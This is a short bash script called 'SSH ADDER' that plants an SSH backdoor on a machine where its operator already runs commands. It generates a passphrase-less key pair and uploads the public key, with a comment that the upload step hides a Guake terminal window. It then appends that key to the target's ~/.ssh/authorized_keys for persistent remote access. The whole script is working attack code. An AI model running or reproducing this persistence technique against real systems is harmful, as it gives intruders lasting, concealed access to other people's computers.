#!/bin/bash

echo "=============================================================================================="
echo "                                       Starting SSH ADDER                                        "
echo "=============================================================================================="

echo ''
echo 'Must have shell bro'
echo ''

source "$(pwd)/scripts/function.sh"

yes y | ssh-keygen -f $(pwd)/sshkey -N ""
upload_file.sh $(pwd)/sshkey.pub         # this will call hide_guake
call_cmd "mkdir -p ~/.ssh/"
call_cmd "cat /dev/shm/sshkey.pub >> ~/.ssh/authorized_keys"


